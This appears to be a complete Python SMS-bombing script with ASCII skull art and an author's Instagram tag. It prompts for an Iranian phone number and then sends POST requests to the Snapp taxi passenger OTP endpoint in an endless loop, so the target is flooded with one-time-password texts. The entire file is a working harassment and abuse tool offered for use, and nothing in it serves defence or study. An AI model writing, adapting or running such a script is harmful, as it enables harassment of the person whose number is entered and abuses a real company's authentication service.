import requests as req , time 

print ("Hello and welcome this iz undead :)")
print('''

                    :::!~!!!!!:.
                    .xUHWH!! !!?M88WHX:.
                  .X*#M@$!!  !X!M$$$$$$WWx:.
                :!!!!!!?H! :!$!$$$$$$$$$$8X:
                !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
              :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
              ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
                !:~~~ .:!M"T#$$$$WX??#MRRMMM!
                ~?WuxiW*`   `"#$$$$8!!!!??!!!
              :X- M$$$$       `"T#$T~!8$WUXU~
              :%`  ~#$$$m:        ~!~ ?$$$$$$
            :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
  .....   -~~:<` !    ~?T#$$@@W@*?$$      /`
  W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
  #"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
  :::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
  .~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
  Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
  $R@i.~~ !     :   ~$$$$$B$$en:``
  ?MXT@Wx.~    :     ~"##*$$$$M~
      IG : ThisIzUnD3ad...
''')
phonenumber = input("ENter Your Ph0ne Number with +98 before it:")
url1 = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
data1 = {"cellphone":""+phonenumber}

print("Y0ur Number:")
print (phonenumber)

while True:
  request = req.post(url1,data=data1).status_code
  print("Spamming...")
  print(request)